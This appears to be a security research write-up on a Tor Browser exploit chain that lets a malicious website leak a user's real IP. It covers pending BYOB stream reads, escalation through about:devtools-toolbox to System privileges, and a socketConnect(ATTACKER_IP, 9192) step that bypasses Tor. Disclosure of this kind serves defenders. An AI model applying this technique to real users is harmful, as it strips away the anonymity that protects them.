blocks.text: This research is part of OpenAI's Patch the Planet program.

When we think about anonymity and security on the internet, as well as the dark web, one of the first things that come to mind is Tor, this great network of nodes that helps us navigate more safely through the most remote corners of the internet.

blocks.text: In this article, we show how a malicious website can overcome the defenses of Tor Browser (15.0.22, default settings) to de-anonymize the user and leak their real IP.

blocks.text: Tor Browser concept
Tor Browser distributes a modified and hardened version of Firefox ESR together with the Tor daemon, which runs as a separate process.

inlines.text: Tor Browser distributes a modified and hardened version of Firefox ESR together with the Tor daemon, which runs as a separate process.

blocks.text: When we visit a normal website through Tor, the website sees the IP address of the exit relay instead of ours. With an .onion service, things work a little differently. Our browser and the service communicate through a shared Tor relay (called a rendezvous point) without revealing their IP addresses to each other. In both cases anonymity depends on the browser not opening a separate connection outside Tor. The final stage of this exploit violates that application boundary.

blocks.text: Before continuing, BYOB is a reading mode in which the consumer provides the memory where the producer should write. In a normal read, the stream creates or delivers its own block of data. With BYOB, the reader offers an already prepared Uint8Array for the producer to fill directly, avoiding another allocation and copy. Gecko coordinates that memory through the reader, a pending descriptor and controller.byobRequest.view. When the producer finishes, it indicates how many bytes it wrote through respond(). The exploit deliberately omits that response to keep the read and its memory state pending.

blocks.text: Fourth Phase: Revealing the IP

The forged URI is also the instruction for the last phase. The about:devtools-toolbox module turns it into a packaged DevTools page, assigns the System principal to its channel, allows scripts and does not force it to load in an ordinary content process. That is why the reload accepted in phase 3 ends in privileged code.

blocks.text:
System history -> about:devtools-toolbox
DevTools -> socketConnect(ATTACKER_IP, 9192)
parent -> direct TCP socket
listener -> accept() -> public source IP address of the connection that bypasses Tor

The server does not need to authenticate DevTools or respond to its protocol. When accept() returns the connection, the TCP handshake has already delivered the public source IP address of the connection that bypasses Tor, whether it is the device's direct public IP address or a VPN/NAT address, while the original page requests continue to show a Tor exit address.

blocks.text: Conclusions

The whole point of Tor Browser is to hide the user's IP address, so leaking that address undoes the protection that routing through the network provides. The browser is one layer of defense, not a guarantee on its own. For stronger anonymity, pair Tor Browser with hardened setups such as dedicated devices and careful operational habits.
